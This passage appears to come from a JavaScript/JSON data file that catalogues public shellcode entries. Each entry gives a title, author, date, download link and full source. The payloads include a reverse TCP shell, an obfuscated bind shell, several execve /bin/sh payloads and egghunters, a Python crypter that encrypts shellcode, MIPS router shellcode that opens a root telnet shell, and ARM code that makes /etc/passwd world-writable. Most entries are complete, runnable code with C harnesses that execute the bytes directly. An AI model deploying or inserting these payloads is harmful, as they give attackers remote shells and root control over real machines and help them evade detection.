( (XOR [static] and XOR [pseudorandom]), ADD [static] )", "   * to encrypt the shellcode use the Uzumaki Crypter <https://github.com/geyslan/SLAE/blob/master/7th.assignment/uzumaki_crypter.py>", "   * null-free", "", "   # gcc -m32 -fno-stack-protector -z execstack uzumaki_decrypter_shellcode.c -o uzumaki_decrypter_shellcode", "", "   Testing", "   # ./uzumaki_decrypter_shellcode", "", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char shellcode[] = \\", "", "              // Shellcode Decrypter", "              \"\\x29\\xc9\\x74\\x14\\x5e\\xb1\"", "              \"\\x14\"  // <- shellcode length", "              \"\\x46\\x8b\\x06\\x83\\xe8\"", "              \"\\x09\"  // <- ADD key", "              \"\\x34\"", "              \"\\x9f\"  // <- XOR key", "              \"\\x32\\x46\\xff\\x88\\x06\\xe2\\xf1\\xeb\\x05\\xe8\"", "              \"\\xe7\\xff\\xff\\xff\"", "", "              // Crypted Shellcode", "              \"\\x31\\x70\\xaa\\x92\\xd7\\x2d\\xce\\xaf\\xe1\\xa8\"", "              \"\\xcc\\x8d\\xa8\\xe1\\xdb\\x9d\\xa1\\x81\\xfe\\xba\"", "              \"\\xdb\";", "", "", "main ()", "{", "", "    // When contains null bytes, printf will show a wrong shellcode length.", "", "    printf(\"Shellcode Length:  %d\\n\", strlen(shellcode));", "", "    // Pollutes all registers ensuring that the shellcode runs in any circumstance.", "", "    __asm__ (\"movl $0xffffffff, %eax\\n\\t\"", "            \"movl %eax, %ebx\\n\\t\"", "            \"movl %eax, %ecx\\n\\t\"", "            \"movl %eax, %edx\\n\\t\"", "            \"movl %eax, %esi\\n\\t\"", "            \"movl %eax, %edi\\n\\t\"", "            \"movl %eax, %ebp\\n\\t\"", "", "            // Calling the shellcode", "            \"call shellcode\");", "", "}"]},
{"Title": "Linux/x86 - Uzumaki Encryptor Shellcode (Generator)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Generator", "Download": "https://github.com/geyslan/SLAE/blob/44d304a6158709ccdc2e23f74874e028ae201bfe/7th.assignment/uzumaki_crypter.py", "View": null, "code": ["#!/usr/bin/python", "# -*- coding: utf-8 -*-", "#", "# Uzumaki Shellcode Crypter - Python Language", "# Copyright (C) 2013 Geyslan G. Bem, Hacking bits", "#", "#   http://hackingbits.com", "#   geyslan@gmail.com", "#", "# This program is free software: you can redistribute it and/or modify", "# it under the terms of the GNU General Public License as published by", "# the Free Software Foundation, either version 3 of the License, or", "# (at your option) any later version.", "#", "# This program is distributed in the hope that it will be useful,", "# but WITHOUT ANY WARRANTY; without even the implied warranty of", "# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the", "# GNU General Public License for more details.", "#", "# You should have received a copy of the GNU General Public License", "# along with this program.  If not, see <http://www.gnu.org/licenses/>.", "", "'''", "   uzumaki_crypter", "", "   * uses the uzumaki cipher, a custom stream cipher algorithm ( (XOR [static] and XOR [pseudorandom]), ADD [static] )", "", "", "   # ./uzumaki_crypter.py -h", "   # ./uzumaki_crypter.py -a 03 -x f2 -s $'\\x31\\xc9\\xf7\\xe1...\\x80'", "", "'''", "", "import sys", "import getopt", "import string", "", "", "def usage ():", "    usage = \"\"\"", "  -a --add            Byte to be used with bitwise ADD (one byte in hex format)", "                        Default is 01", "                        Eg. -a 2f", "                            --add 1f", "", "  -x --xor            Byte to be used with bitwise XOR (one byte in hex format)", "                        Default is cc", "                        Eg. -x f2", "                            --xor aa", "", "  -s --shellcode      The shellcode to be crypted with the uzumaki cipher", "                        Eg. -s $'\\\\xcd\\\\x80'", "                            --shellcode `printf \"\\\\xcc\\\\x90\"`", "", "  -h --help           This help", "\"\"\"", "    print(usage)", "", "def main():", "    addByte = \"01\"", "    xorByte = \"cc\"", "    shellcode = \"\"    ", "", "    try:", "        opts, args = getopt.getopt(sys.argv[1:], \"ha:x:s:\")", "                ", "    except getopt.GetoptError as err:", "        print(err)", "        usage()", "        sys.exit()", "", "", "    for o, a in opts:", "", "        if o in (\"-h\", \"--help\"):", "            usage()", "            sys.exit()", "", "        elif o in (\"-a\", \"--add\"):", "            if (len(a) != 2 or not all(h in string.hexdigits for h in a)):", "                print(\"  ADD byte has to be in hex format. Eg. -a 3f\\n\")", "                sys.exit()            ", "            addByte = a", "            ", "        elif o in (\"-x\", \"--xor\"):", "            if (len(a) != 2 or not all(h in string.hexdigits for h in a)):", "                print(\"  XOR byte has to be in hex format. Eg. -x f1\\n\")", "                sys.exit()", "            xorByte = a", "", "        elif o in (\"-s\", \"--shellcode\"):", "            shellcode = a.encode(\"utf_8\", \"surrogateescape\")", "", "", "    if (not shellcode):", "        print(\"  Is necessary to inform a shellcode. Eg. -s $'\\\\xcd\\\\x80'\\n\")", "        sys.exit()", "", "    ", "    crypted = \"\"", "    crypted2 = \"\"", "    crypted3 = \"\"", "    crypted4 = \"\"", "    tempbyte = 0x00", "    ", "    for x in range(len(shellcode)):", "        if (x == 0):", "            tempbyte = shellcode[x]", "        else:", "            tempbyte = ((shellcode[x-1] ^ (shellcode[x] ^ int(\"0x\" + xorByte, 16) )) + int(\"0x\" + addByte, 16))", "        if (tempbyte > 0xff or tempbyte <= 0x00):", "            print(\"  A crypted byte value cannot be higher than 0xff or equal to 0x00. Please change the value of the option 'ADD' or/and of the option 'XOR'.\\n\")", "            sys.exit()", "        crypted += \"\\\\x%02x\" % tempbyte", "", "    crypted2 = crypted.replace(\"\\\\x\", \",0x\")[1:]", "", "    crypted3 += r\"\\x29\\xc9\\x74\\x14\\x5e\\xb1\"", "    crypted3 += r\"\\x%02x\" % (len(shellcode) - 1)", "    crypted3 += r\"\\x46\\x8b\\x06\\x83\\xe8\"", "    crypted3 += r\"\\x\" + addByte", "    crypted3 += r\"\\x34\"", "    crypted3 += r\"\\x\" + xorByte ", "    crypted3 += r\"\\x32\\x46\\xff\\x88\\x06\\xe2\\xf1\\xeb\\x05\\xe8\\xe7\\xff\\xff\\xff\"", "    crypted3 += crypted", "", "    crypted4 = crypted3.replace(\"\\\\x\", \",0x\")[1:]", "", "    crypted = '\"' + crypted + '\";'", "    crypted3 = '\"'+ crypted3 + '\";'", "", "    print(\"Uzumaki Shellcode Crypter - Swirling Everything\")", "    print(\"http://hackingbits.com\")", "    print(\"https://github.com/geyslan/SLAE.git\")", "    print(\"License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\\n\\n\")", "", "    print(\"Crypted shellcode:\\n\")", "    print(crypted)", "    print()", "    print(crypted2)", "    print(\"\\n\\n\")", "", "    print(\"Crypted shellcode with decrypter built-in:\\n\")", "    print(crypted3)", "    print()", "    print(crypted4)", "    print(\"\\n\\n\")", "", "    print(\"Length: %d\" % len(bytearray(shellcode)))", "    print(\"Length with decrypter: %d\" % ((len(crypted3) - 2) / 4))", "", "", "if __name__ == \"__main__\":", "    main()"]},
{"Title": "Linux/x86 - Reverse (192.168.1.10:31337/TCP) Shell Shellcode (92 bytes)", "Author": "Russell Willis", "Published": ": 2013-05-17", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-849.php", "View": null, "code": ["/*", "Title   : reversetcpbindshell  (92 bytes)", "Date    : 16 May 2013", "Author  : Russell Willis <codinguy@gmail.com>", "Testd on: Linux/x86 (SMP Debian 3.2.41-2 i686)", " ", "$ objdump -D reversetcpbindshell -M intel", "", "reversetcpbindshell:     file format elf32-i386", "", "Disassembly of section .text:", "", "08048060 <_start>:", " 8048060:       31 c0                   xor    eax,eax", " 8048062:       31 db                   xor    ebx,ebx", " 8048064:       31 c9                   xor    ecx,ecx", " 8048066:       31 d2                   xor    edx,edx", " 8048068:       b0 66                   mov    al,0x66", " 804806a:       b3 01                   mov    bl,0x1", " 804806c:       51                      push   ecx", " 804806d:       6a 06                   push   0x6", " 804806f:       6a 01                   push   0x1", " 8048071:       6a 02                   push   0x2", " 8048073:       89 e1                   mov    ecx,esp", " 8048075:       cd 80                   int    0x80", " 8048077:       89 c6                   mov    esi,eax", " 8048079:       b0 66                   mov    al,0x66", " 804807b:       31 db                   xor    ebx,ebx", " 804807d:       b3 02                   mov    bl,0x2", " 804807f:       68 c0 a8 01 0a          push   0xa01a8c0", " 8048084:       66 68 7a 69             pushw  0x697a", " 8048088:       66 53                   push   bx", " 804808a:       fe c3                   inc    bl", " 804808c:       89 e1                   mov    ecx,esp", " 804808e:       6a 10                   push   0x10", " 8048090:       51                      push   ecx", " 8048091:       56                      push   esi", " 8048092:       89 e1                   mov    ecx,esp", " 8048094:       cd 80                   int    0x80", " 8048096:       31 c9                   xor    ecx,ecx", " 8048098:       b1 03                   mov    cl,0x3", "0804809a <dupfd>:", " 804809a:       fe c9                   dec    cl", " 804809c:       b0 3f                   mov    al,0x3f", " 804809e:       cd 80                   int    0x80", " 80480a0:       75 f8                   jne    804809a", " 80480a2:       31 c0                   xor    eax,eax", " 80480a4:       52                      push   edx", " 80480a5:       68 6e 2f 73 68          push   0x68732f6e", " 80480aa:       68 2f 2f 62 69          push   0x69622f2f", " 80480af:       89 e3                   mov    ebx,esp", " 80480b1:       52                      push   edx", " 80480b2:       53                      push   ebx", " 80480b3:       89 e1                   mov    ecx,esp", " 80480b5:       52                      push   edx", " 80480b6:       89 e2                   mov    edx,esp", " 80480b8:       b0 0b                   mov    al,0xb", " 80480ba:       cd 80                   int    0x80", "*/", "", "#include <stdio.h>", "", "/*", " ipaddr 192.168.1.10 (c0a8010a)", " port 31337 (7a69)", "*/", "#define IPADDR \"\\xc0\\xa8\\x01\\x0a\"", "#define PORT \"\\x7a\\x69\"", "", "unsigned char code[] =", "\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\"", "\"\\xb0\\x66\\xb3\\x01\\x51\\x6a\\x06\\x6a\"", "\"\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\"", "\"\\xc6\\xb0\\x66\\x31\\xdb\\xb3\\x02\\x68\"", "IPADDR\"\\x66\\x68\"PORT\"\\x66\\x53\\xfe\"", "\"\\xc3\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\"", "\"\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x03\\xfe\"", "\"\\xc9\\xb0\\x3f\\xcd\\x80\\x75\\xf8\\x31\"", "\"\\xc0\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\"", "\"\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\"", "\"\\x89\\xe1\\x52\\x89\\xe2\\xb0\\x0b\\xcd\"", "\"\\x80\";", "", "main()", "{", "\tprintf(\"Shellcode Length: %d\\n\", sizeof(code)-1);", "\tint (*ret)() = (int(*)())code;", "\tret();", "}"]},
{"Title": "Linux/x86 - Egghunter (0x5090) Shellcode (38 bytes)", "Author": "Russell Willis", "Published": ": 2013-05-28", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-850.php", "View": null, "code": ["/*", "Title   : egghunter shellcode", "        : hunter (30 bytes), marker (8 bytes), shellcode (28 bytes)", "Date    : 28 May 2013", "Author  : Russell Willis <codinguy@gmail.com>", "Testd on: Linux/x86 (SMP Debian 3.2.41-2 i686)", "", "Comments:", "    Using sigaction system call for hunter code for robust operation.", "    Based on paper 'Safely Searching Process Virtual Address Space'.", "    This is a must read paper, instructive and inspiring, found here:", "    http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf", "    see section 3.1.3 sigaction(2), page 13.", "    ", "    To build:", "    gcc -fno-stack-protector -z execstack egghunter.c -o egghunter", "*/", "", "#include <stdio.h>", "#include <string.h>", "#include <stdlib.h>", "", "/*", " * Marker code must be executable, currently:", " *   /x90 nop", " *   /x50 push eax", " */ ", "#define MARKER \"\\x90\\x50\" ", "", "char hunter[] = ", "    \"\\x66\\x81\\xc9\\xff\\x0f\\x41\\x6a\\x43\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xf1\"", "    \"\\xb8\"MARKER\"\"MARKER\"\\x89\\xcf\\xaf\\x75\\xec\\xaf\\x75\\xe9\\xff\\xe7\";", "char marker[] = MARKER; ", "char shellcode[] = ", "    \"\\x31\\xc0\\x31\\xd2\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\"", "    \"\\x89\\xe3\\x52\\x53\\x89\\xe1\\x52\\x89\\xe2\\xb0\\x0b\\xcd\\x80\";", " ", "int ", "main(void) ", "{", "    int i=0, nmarkers = 4, markerlen = sizeof(marker)-1;", "    /* ", "     * Setup area of memory for testing,", "     * place marker and shellcode into area.", "     */ ", "    char *egg = malloc(128);", "    memcpy(egg+(markerlen*nmarkers), shellcode, sizeof(shellcode)-1);", "    do {", "      memcpy(egg+i, marker, markerlen);", "      i += markerlen;", "    } while(i != (markerlen * nmarkers));", "    /*", "     * Run hunter to search for marker and jump to shellcode ", "     */", "    int (*ret)() = (int(*)())hunter;", "    ret();", "    free(egg);", "    return 0;", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh) + Obfuscated Shellcode (30 bytes)", "Author": "Russell Willis", "Published": ": 2013-07-03", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-851.php", "View": null, "code": ["/*", "", "Title   : Obfuscated execve /bin/sh (30 bytes)", "Date    : 3rd July 2013", "Author  : Russell Willis <codinguy@gmail.com>", "System  : Linux/x86 (SMP Debian 3.2.41-2 i686)", "  ", "To build:", "gcc -fno-stack-protector -z execstack -o shellcode shellcode.c", "", "00000000  31C9              xor ecx,ecx", "00000002  F7E9              imul ecx", "00000004  51                push ecx", "00000005  040B              add al,0xb", "00000007  EB08              jmp short 0x11", "00000009  5E                pop esi", "0000000A  87E6              xchg esp,esi", "0000000C  99                cdq", "0000000D  87DC              xchg ebx,esp", "0000000F  CD80              int 0x80", "00000011  E8F3FFFFFF        call dword 0x9", "00000016  2F                das", "00000017  62696E            bound ebp,[ecx+0x6e]", "0000001A  2F                das", "0000001B  2F                das", "0000001C  7368              jnc 0x86", "", "*/", "", "#include <stdio.h>", " ", "unsigned char code[] = \\", "\"\\x31\\xc9\\xf7\\xe9\\x51\\x04\\x0b\\xeb\\x08\\x5e\\x87\\xe6\\x99\\x87\\xdc\\xcd\\x80\"", "\"\\xe8\\xf3\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\";", " ", "main()", "{", "    printf(\"Shellcode Length: %d\\n\", sizeof(code)-1);", "    int (*ret)() = (int(*)())code;", "    ret();", "}"]},
{"Title": "Linux/x86 - Bind (/TCP) Shell Shellcode (112 bytes)", "Author": "Russell Willis", "Published": ": 2013-07-03", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-852.php", "View": null, "code": ["/*", "", "Title   : Obfuscated tcp bind shell (112 bytes)", "Date    : 3 July 2013", "Author  : Russell Willis <codinguy@gmail.com>", "System  : Linux/x86 (SMP Debian 3.2.41-2 i686)", "", "To build:", "gcc -fno-stack-protector -z execstack shellcode.c -o shellcode", "    ", "00000000  D9EE              fldz", "00000002  9BD97424F4        fstenv [esp-0xc]", "00000007  5D                pop ebp", "00000008  8D6D59            lea ebp,[ebp+0x59]", "0000000B  31DB              xor ebx,ebx", "0000000D  F7EB              imul ebx", "0000000F  FEC3              inc bl", "00000011  51                push ecx", "00000012  6A06              push byte +0x6", "00000014  6A01              push byte +0x1", "00000016  6A02              push byte +0x2", "00000018  FFD5              call ebp", "0000001A  89C6              mov esi,eax", "0000001C  FEC3              inc bl", "0000001E  52                push edx", "0000001F  66687A69          push word 0x697a", "00000023  6653              push bx", "00000025  89E1              mov ecx,esp", "00000027  6A10              push byte +0x10", "00000029  51                push ecx", "0000002A  56                push esi", "0000002B  FFD5              call ebp", "0000002D  B304              mov bl,0x4", "0000002F  6A01              push byte +0x1", "00000031  56                push esi", "00000032  FFD5              call ebp", "00000034  B305              mov bl,0x5", "00000036  52                push edx", "00000037  52                push edx", "00000038  56                push esi", "00000039  FFD5              call ebp", "0000003B  89C3              mov ebx,eax", "0000003D  31C9              xor ecx,ecx", "0000003F  B103              mov cl,0x3", "00000041  FEC9              dec cl", "00000043  B03F              mov al,0x3f", "00000045  CD80              int 0x80", "00000047  75F8              jnz 0x41", "00000049  31DB              xor ebx,ebx", "0000004B  F7E3              mul ebx", "0000004D  51                push ecx", "0000004E  EB13              jmp short 0x63", "00000050  5E                pop esi", "00000051  87E6              xchg esp,esi", "00000053  87DC              xchg ebx,esp", "00000055  B00B              mov al,0xb", "00000057  CD80              int 0x80", "00000059  5F                pop edi", "0000005A  6A66              push byte +0x66", "0000005C  58                pop eax", "0000005D  89E1              mov ecx,esp", "0000005F  CD80              int 0x80", "00000061  57                push edi", "00000062  C3                ret", "00000063  E8E8FFFFFF        call dword 0x50", "00000068  2F                das", "00000069  62696E            bound ebp,[ecx+0x6e]", "0000006C  2F                das", "0000006D  2F                das", "0000006E  7368              jnc 0xd8", "*/", "", "#include <stdio.h>", "", "unsigned char code[] = \\", "\"\\xd9\\xee\\x9b\\xd9\\x74\\x24\\xf4\\x5d\\x8d\\x6d\\x59\\x31\\xdb\\xf7\"", "\"\\xeb\\xfe\\xc3\\x51\\x6a\\x06\\x6a\\x01\\x6a\\x02\\xff\\xd5\\x89\\xc6\"", "\"\\xfe\\xc3\\x52\\x66\\x68\\x7a\\x69\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\"", "\"\\x56\\xff\\xd5\\xb3\\x04\\x6a\\x01\\x56\\xff\\xd5\\xb3\\x05\\x52\\x52\"", "\"\\x56\\xff\\xd5\\x89\\xc3\\x31\\xc9\\xb1\\x03\\xfe\\xc9\\xb0\\x3f\\xcd\"", "\"\\x80\\x75\\xf8\\x31\\xdb\\xf7\\xe3\\x51\\xeb\\x13\\x5e\\x87\\xe6\\x87\"", "\"\\xdc\\xb0\\x0b\\xcd\\x80\\x5f\\x6a\\x66\\x58\\x89\\xe1\\xcd\\x80\\x57\"", "\"\\xc3\\xe8\\xe8\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\";", "", "main()", "{", "    printf(\"Shellcode Length: %d\\n\", sizeof(code)-1);", "    int (*ret)() = (int(*)())code;", "    ret();", "}"]},
{"Title": "Linux/MIPS (Little Endian) - system() Shellcode (80 bytes)", "Author": "Jacob Holcomb", "Published": ": 2013-07-27", "Platform": "Linux_MIPS", "Download": "https://old.exploit-db.com/download/27132.txt", "View": "https://old.exploit-db.com/raw/27132/", "code": ["# Disassembled MIPS Little Endian Shellcode ", "# Shellcode was designed for ACSD exploit on the ASUS RT-AC66U SOHO router.", "# CVE: CVE-2013-4659", "# Written by Jacob Holcomb, Security Analyst @ Independent Security Evaluators", "# Blog: http://infosec42.blogspot.com", "# Company Website: http://securityevaluators.com", "#", "# NOTE:", "# In order to use this MIPS ASM elsewhere, you will need to change the address", "# of the system() function call to match your environment and reassemble the ASM.", "# _ characters in the comments below represent a space.", "", "", "    lui     t0,0x6e6c //Loading Upper Immediate nl into temp. reg. #0", "    ori     t0,t0,0x6574 //Bitwise OR immediate. Putting et into lower 16 bits of t0", "    sw      t0,-20(sp) //Store word pointer to command string for execution", "    ", "    lui     t1,0x2064 //Loading Upper Immediate _d into temp. reg. #1", "    ori     t1,t1,0x7465 //Bitwise OR immediate. Putting te into lower 16 bits of t0", "    sw      t1,-16(sp) //Store next part of command", "", "    lui     t2,0x2f20 //Loading Upper Immediate /_ into temp. reg. #2", "    ori     t2,t2,0x6c2d //Bitwise OR immediate. Putting l- into lower 16 bits of t1", "    sw      t2,-12(sp) //Store next part of command", "", "    lui     t3,0x2f6e //Loading Upper Immedate /n into temp. reg. #3", "    ori     t3,t3,0x6962 //Bitwise OR immediate. Putting ib into lower 16 bits of t2", "    sw      t3,-8(sp) //Store next part of command", "", "    li      t4,26739 //Loading Immediate hs00 into temp. reg. #4", "    sw      t4,-4(sp) //Store next part of command", "", "    addi    a0,sp,-20 //Store \"telnetd -l /bin/sh\" in reg. a0 for system() function call", "    addi    sp,sp,-20 //Move stack pointer to \"telnetd -l /bin/sh\" string on the stack ", "", "    lui     t9,0x2ab4 //Loading Upper Immediate of system() into t9", "    ori     t9,t9,0xf050 //Bitwise OR immediate. Putting rest of system() into t9", "    jalr    t9 //Jumpying to t9/system()", "", "    andi    at,k1,0x4132 //Filler instruction for branch delay", "", "", "# NOTE: Assembled shellcode", "#", "#    #80 Bytes system() Shellcode by Jacob Holcomb of ISE", "#    #Calling system() and executing telnetd -l /bin/sh", "#    shellcode = \"\\x6c\\x6e\\x08\\x3c\\x74\\x65\\x08\\x35\\xec\\xff\\xa8\"", "#    shellcode += \"\\xaf\\x64\\x20\\x09\\x3c\\x65\\x74\\x29\\x35\\xf0\\xff\"", "#    shellcode += \"\\xa9\\xaf\\x20\\x2f\\x0a\\x3c\\x2d\\x6c\\x4a\\x35\\xf4\"", "#    shellcode += \"\\xff\\xaa\\xaf\\x6e\\x2f\\x0b\\x3c\\x62\\x69\\x6b\\x35\"", "#    shellcode += \"\\xf8\\xff\\xab\\xaf\\x73\\x68\\x0c\\x24\\xfc\\xff\\xac\"", "#    shellcode += \"\\xaf\\xec\\xff\\xa4\\x23\\xec\\xff\\xbd\\x23\\xb4\\x2a\"", "#    shellcode += \"\\x19\\x3c\\x50\\xf0\\x39\\x37\\x09\\xf8\\x20\\x03\\x32\"", "#    shellcode += \"\\x41\\x61\\x33\""]},
{"Title": "Linux/ARM - chmod( /etc/passwd 0777) Shellcode (39 bytes)", "Author": "gunslinger_", "Published": ": 2013-09-04", "Platform": "ARM", "Download": "http://shell-storm.org/shellcode/files/shellcode-853.php", "View": null, "code": ["/* ", "    Title       : Linux/ARM - chmod(\"/etc/passwd\", 0777) - 39 bytes", "    Date        : 2013-09-04", "    Author      : gunslinger_ (yuda at cr0security dot com)", "    Tested on   : ARM1176 rev6 (v6l)", "    ", "    An ARM Hardcoded Shellcode without 0x20, 0x0a, and 0x00.", "    ", "    Cr0security.com", "    ", "*/", "#include <stdio.h>", "", "char *shellcode = \"\\x01\\x60\\x8f\\xe2\"    // add  r6, pc, #1", "                  \"\\x16\\xff\\x2f\\xe1\"    // bx   r6", "                  \"\\x78\\x46\"            // mov  r0, pc", "                  \"\\x10\\x30\"            // adds r0, #16", "                  \"\\xff\\x21\"            // movs r1, #255    ; 0xff", "                  \"\\xff\\x31\"            // adds r1, #255    ; 0xff", "                  \"\\x01\\x31\"            // adds r1, #1", "                  \"\\x0f\\x37\"            // adds r7, #15", "                  \"\\x01\\xdf\"            // svc  1", "                  \"\\x40\\x40\"            // eors r0, r0", "                  \"\\x01\\x27\"            // movs r7, #1", "                  \"\\x01\\xdf\"            // svc  1", "                  \"\\x2f\\x65\\x74\\x63\"    // .word    0x6374652f", "                  \"\\x2f\\x70\\x61\\x73\"    // .word    0x7361702f", "                  \"\\x73\\x77\"            // .short   0x7773", "                  \"\\x64\";               // .byte    0x64", "", "int main(){", "    fprintf(stdout,\"Shellcode length: %d\\n\", strlen(shellcode));", "    (*(void(*)()) shellcode)();", "    return 0;", "}"]}
]

const pag_2 = [{"Title": "Linux/ARM - creat(\"/root/pwned\", 0777) Shellcode (39 bytes)", "Author": "gunslinger_", "Published": ": 2013-09-04", "Platform": "ARM", "Download": "http://shell-storm.org/shellcode/files/shellcode-854.php", "View": null, "code": ["/* ", "    Title       : Linux/ARM - creat(\"/root/pwned\", 0777) - 39 bytes", "    Date        : 2013-09-04", "    Author      : gunslinger_ (yuda at cr0security dot com)", "    Tested on   : ARM1176 rev6 (v6l)", "    ", "    An ARM Hardcoded Shellcode without 0x20, 0x0a, and 0x00.", "    ", "    Cr0security.com", "    ", "*/", "#include <stdio.h>", "", "char *shellcode = \"\\x01\\x60\\x8f\\xe2\"    // add  r6, pc, #1", "                  \"\\x16\\xff\\x2f\\xe1\"    // bx   r6", "                  \"\\x78\\x46\"            // mov  r0, pc", "                  \"\\x10\\x30\"            // adds r0, #16", "                  \"\\xff\\x21\"            // movs r1, #255    ; 0xff", "                  \"\\xff\\x31\"            // adds r1, #255    ; 0xff", "                  \"\\x01\\x31\"            // adds r1, #1", "                  \"\\x08\\x27\"            // adds r7, #8", "                  \"\\x01\\xdf\"            // svc  1", "                  \"\\x40\\x40\"            // eors r0, r0", "                  \"\\x01\\x27\"            // movs r7, #1", "                  \"\\x01\\xdf\"            // svc  1", "                  \"\\x2f\\x72\\x6f\\x6f\"    // .word    0x6f6f722f", "                  \"\\x74\\x2f\\x70\\x77\"    // .word    0x77702f74", "                  \"\\x65\\x63\"            // .short   0x656e", "                  \"\\x64\";               // .byte    0x64", "", "int main(){", "    fprintf(stdout,\"Shellcode length: %d\\n\", strlen(shellcode));", "    (*(void(*)()) shellcode)();", "    return 0;", "}"]},
{"Title": "Linux/ARM - execve(\"/bin/sh\", [], [0 vars]) Shellcode (35 bytes)", "Author": "gunslinger_", "Published": ": 2013-09-04", "Platform": "ARM", "Download": "http://shell-storm.org/shellcode/files/shellcode-855.php", "View": null, "code": ["/* ", "    Title       : Linux/ARM - execve(\"/bin/sh\", [], [0 vars]) - 35 bytes", "    Date        : 2013-09-04", "    Author      : gunslinger_ (yuda at cr0security dot com)", "    Tested on   : ARM1176 rev6 (v6l)", "    ", "    An ARM Hardcoded Shellcode without 0x20, 0x0a, and 0x00.", "    ", "    Cr0security.com", "    ", "*/", "#include <stdio.h>", "", "char *shellcode = \"\\x01\\x60\\x8f\\xe2\"    // add     r6, pc, #1", "                  \"\\x16\\xff\\x2f\\xe1\"    // add     bx      r6", "                  \"\\x40\\x40\"            // eors    r0, r0", "                  \"\\x78\\x44\"            // add     r0, pc", "                  \"\\x0c\\x30\"            // adds    r0, #12", "                  \"\\x49\\x40\"            // eors    r1, r1", "                  \"\\x52\\x40\"            // eors    r2, r2", "                  \"\\x0b\\x27\"            // movs    r7, #11", "                  \"\\x01\\xdf\"            // svc     1", "                  \"\\x01\\x27\"            // movs    r7, #1", "                  \"\\x01\\xdf\"            // svc     1", "                  \"\\x2f\\x2f\"            // .short  0x2f2f", "                  \"\\x62\\x69\\x6e\\x2f\"    // .word   0x2f6e6962", "                  \"\\x2f\\x73\"            // .short  0x732f", "                  \"\\x68\";               // .byte   0x68", "", "int main(){", "    fprintf(stdout,\"Shellcode length: %d\\n\", strlen(shellcode));", "    (*(void(*)()) shellcode)();", "    return 0;", "}"]},
{"Title": "Linux/x86 - Egg Omelet (Multi-Egghunter) + Reverse (192.168.122.1:43981/TCP) Shell (/bin/sh) Shellcode", "Author": "Ryan Fenno", "Published": ": 2013-09-23", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-856.php", "View": null, "code": ["/*", "    Title:      Multi-Egghunter", "    Author:     Ryan Fenno (@ryanfenno)", "    Date:       20 September 2013", "    Tested on:  Linux/x86 (Ubuntu 12.0.3)", "", "    Description:", "", "    This entry represents an extension of skape's sigaction(2)", "    egghunting method [1] to multiple eggs. It is similar in spirit", "    to BJ 'SkyLined' Wever's omelet shellcode for Win32 [2]. The", "    proof-of-concept presented here splits a reverse TCP bind shell [3]", "    into two parts. The egghunter is not only responsible for finding", "    the two eggs, but also for executing them in the correct order. It", "    is readily extendable to any (reasonable) number of eggs.", "", "    References:", "", "    [1] skape, \"Safely Searching Process Virtual Address Space\",", "        www.hick.org/code/skape/papers/egghunt-shellcode.pdf", "    [2] Wever, Berend-Jan, \"w32-SEH-omelet-shellcode\",", "        http://code.google.com/p/w32-seh-omelet-shellcode/", "    [3] Willis, R. \"reversetcpbindshell\",", "        http://shell-storm.org/shellcode/files/shellcode-849.php", "*/", "", "#include <stdio.h>", "", "#define    MARKER  \"\\x93\\x51\\x93\\x59\"", "#define    TAG1    \"\\x01\\x51\\x93\\x59\" // easiest to use latter three bytes", "#define    TAG2    \"\\x02\\x51\\x93\\x59\" // of MARKER for latter three of TAGs", "", "// first egg/tag/shellcode", "#define    IPADDR  \"\\xc0\\xa8\\x7a\\x01\" // 192.168.122.1", "#define    PORT    \"\\xab\\xcd\"         // 43981", "unsigned char shellcode1[] =", "MARKER", "TAG1", "//SHELLCODE1", "\"\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\x43\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\"", "\"\\x96\\xb0\\x66\\xb3\\x03\\x68\"    IPADDR    \"\\x66\\x68\" PORT \"\\x66\"", "\"\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\"", "// perform the jump", "\"\\x83\\xc4\\x20\\x5f\\x83\\xec\\x24\\xff\\xe7\"", ";", "/*", "global _start", "section .text", "_start:", "    xor ebx, ebx", "    mul ebx", "", "    mov al, 0x66          ; socketcall() <linux/net.h>", "    inc ebx               ; socket()", "    push edx              ; arg3 :: protocol    = 0", "    push ebx              ; arg2 :: SOCK_STREAM = 1", "    push byte 0x2         ; arg1 :: AF_INET     = 2", "    mov ecx, esp", "    int 0x80", "    xchg eax, esi         ; save clnt_sockfd in esi", "    mov al, 0x66          ; socketcall()", "    mov bl, 0x3           ; connect()", "                          ; build sockaddr_in struct (srv_addr)", "    push dword 0x017AA8C0 ;   IPv4 address 192.168.122.1 in hex (little endian)", "    push word 0x697a      ;   TCP port 0x7a69 = 31337", "    push word 0x2         ;   AF_INET = 2", "    mov ecx, esp          ; pointer to sockaddr_in struct", "    push dword 0x10       ; arg3 :: sizeof(struct sockaddr) = 16 [32-bits]", "    push ecx              ; arg2 :: pointer to sockaddr_in struct", "    push esi              ; arg1 :: clnt_sockfd", "    mov ecx, esp", "    int 0x80", "", "    ;---- perform the jump", "    ; looking at the stack at this point, the target for the jump", "    ; is at $esp+0x20, so...", "    add esp, 0x20", "    pop edi", "    sub esp, 0x24", "    jmp 